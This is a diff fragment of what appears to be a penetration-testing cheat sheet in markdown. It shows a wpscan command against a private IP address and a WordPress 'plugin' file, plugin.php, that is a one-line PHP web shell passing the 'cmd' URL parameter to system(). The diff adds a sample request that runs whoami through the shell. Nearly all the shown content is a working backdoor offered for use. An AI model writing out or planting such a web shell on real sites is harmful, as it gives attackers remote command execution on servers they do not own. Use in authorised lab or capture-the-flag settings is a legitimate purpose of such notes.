@@ -9,7 +9,7 @@ wpscan --no-update --url http://192.168.110.244/ --random-user-agent -v \
 
 #### WordPress Plugin
 
-```
+```php
 NAME: plugin.php
 <?php
 /**
@@ -20,4 +20,8 @@ NAME: plugin.php
  */
 echo system($_GET[cmd]); 
 ?>
+```
+
+```
+http://<ip-address>/wordpress/wp-content/plugins/plugin.php?cmd=whoami
 ```
